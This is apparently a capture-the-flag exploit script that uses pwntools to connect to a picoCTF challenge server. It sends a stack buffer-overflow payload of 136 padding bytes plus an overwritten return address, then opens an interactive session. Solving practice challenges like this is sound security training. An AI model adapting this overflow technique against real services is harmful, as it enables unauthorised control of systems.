from pwn import *

target = remote("saturn.picoctf.net", 65355)
print(target.recvuntil(b"Input: "))
payload = b"a"*136 + p32(0x56556311)

target.sendline(payload)
print(target.recvline())

target.interactive()
